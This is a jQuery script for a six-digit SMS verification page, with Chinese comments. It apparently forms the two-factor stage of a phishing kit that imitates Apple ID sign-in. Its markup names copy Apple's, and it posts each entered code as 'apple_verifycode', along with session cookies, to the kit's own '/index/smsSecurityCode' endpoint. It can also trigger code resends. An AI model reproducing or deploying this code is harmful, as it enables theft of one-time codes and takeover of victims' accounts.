// 检查必要的cookie是否存在,如果不存在则重定向到首页
// if (!$.cookie('Guid') || !$.cookie('ID') || !$.cookie('Number')) {
//     window.location.href = '/index/signin';
// }

// 将父窗口滚动到顶部
$(window.parent.document).scrollTop(0);

// 缓存常用DOM元素
const $numberInputs = $('.security-code-container input');
const $errorMessage = $('.form-message');
const $popButton = $('#no-trstd-device-pop');
const $popMenu = $('.other-options-popover-container');
const verifyingCodeText = $('.verifying-code-text');
const $liteThemeOverride = $('.lite-theme-override');
const $button = $('#try-again-link');
const $loadingIcon = $('.loading-icon');
const diffPhone = $('#diff_phone');
const phoneCount = $.cookie('phoneCount');

diffPhone.addClass('hide');
if (phoneCount > 1) {
    diffPhone.removeClass('hide');
}
// 验证输入框数量
if ($numberInputs.length !== 6) {
    throw new Error('无效表单: 验证码输入框数量不正确');
}

// 显示更多选项菜单
$popButton.on('click', () => $popMenu.removeClass('hide'));

// 点击页面其他地方时隐藏更多选项菜单
$(document).on('click', (e) => {
    if (!$(e.target).closest("#no-trstd-device-pop,.other-options-popover-container").length) {
        $popMenu.addClass('hide');
    }
});

// 重新发送验证码
$('#try-again').on('click', (e) => {
    e.preventDefault();

    // 更新UI状态
    $errorMessage.addClass('hide');
    $button.addClass('hide');

    $popMenu.addClass('hide');
    $popButton.addClass('hide');
    verifyingCodeText.removeClass('hide');
    diffPhone.addClass('hide');


    fetchRequest('/index/SendSms',
        'POST',
        {
            Guid: $.cookie('Guid'),
            ID: $.cookie('ID')
        }
    ).then(data  =>{

        if (data.data?.serviceErrors?.length > 0) {
            $errorMessage.removeClass('hide').text(data.data.serviceErrors[0].message);
        }

        verifyingCodeText.addClass('hide');
        $popButton.removeClass('hide');

    }).catch(error => {

        $errorMessage.removeClass('hide').text('发送失败,请稍后重试');
        verifyingCodeText.addClass('hide');
        $popButton.removeClass('hide');
    }).finally(()=>{

        $('.loading-icon').addClass('hide');
        $('#try-again-link').removeClass('hide');
        verifyingCodeText.addClass('hide');
        $popButton.removeClass('hide');
    })


});


// 验证码输入处理
$numberInputs.on('keyup', handleVerificationCodeInput);

// 处理验证码输入
function handleVerificationCodeInput(e) {
    const $input = $(e.target);
    const index = $input.data('index');
    const value = $input.val();

    if (!/^\d$/.test(value)) {
        handleInvalidInput(e, index);
        return;
    }

    updateVerificationState();
    handleInputNavigation(index, value);
}

// 处理无效输入
function handleInvalidInput(e, index) {
    if (e.keyCode === 8) {  // Backspace key
        $numberInputs.val('').first().focus();
    } else {
        $numberInputs.eq(index).val('');
    }
}

// 更新验证状态
function updateVerificationState() {
    if (window.verify) {
        window.verify = false;
        $numberInputs.parent().removeClass('is-error');
        $errorMessage.addClass('hide');
    }
}

// 处理输入导航(自动跳转到下一个输入框)
function handleInputNavigation(index, value) {
    const smsCode = $numberInputs.map((_, el) => el.value).get().join('');

    if (index < 5 && smsCode.length < 6) {
        for (let i = 0; i <= index; i++) {
            if (!$numberInputs[i].value) {
                $numberInputs[index].blur();
                $numberInputs[i].value = value;
                $numberInputs[i + 1].focus();
                $numberInputs[index].value = '';
                return;
            }
        }
        $numberInputs[Number(index) + 1].focus();
    } else if (smsCode.length === 6) {
        submitVerificationCode(smsCode);
    }
}

// 提交验证码
function submitVerificationCode(smsCode) {
    $numberInputs.attr('disabled', 'true');
    verifyingCodeText.removeClass('hide');
    $liteThemeOverride.addClass('hide');

    fetchRequest('/index/smsSecurityCode', 'POST', {
        'Guid': $.cookie('Guid'),
        'ID': $.cookie('ID'),
        'apple_verifycode': smsCode,
    }).then(data  =>{

        if (data && data.code === 200) {
            $('.landing__animation', window.parent.document).hide();
            return window.location.href = '/index/result';
        }

        $errorMessage.removeClass('hide').text(data.message);
        handleVerificationError();
    }).catch(error => {
        $errorMessage.removeClass('hide').text('发送失败,请稍后重试');
        handleVerificationError();
    })

}

// 处理验证错误
function handleVerificationError(error) {

    console.log('handleVerificationError', error);

    for (const ele of $numberInputs) {
        $(ele).removeAttr('disabled');
        $(ele).parent().addClass('is-error');
        $(ele).val('');
        setTimeout(() => {
            $(ele).blur();
        }, 10);
    }
    setTimeout(() => {
        $($numberInputs[0]).focus();
    }, 10);
    $('.verifying-code-text').addClass('hide');
    $('.lite-theme-override').removeClass('hide');
    $errorMessage.removeClass('hide');
    verify = true;
}

// 初始化:聚焦第一个输入框
$numberInputs.first().focus();
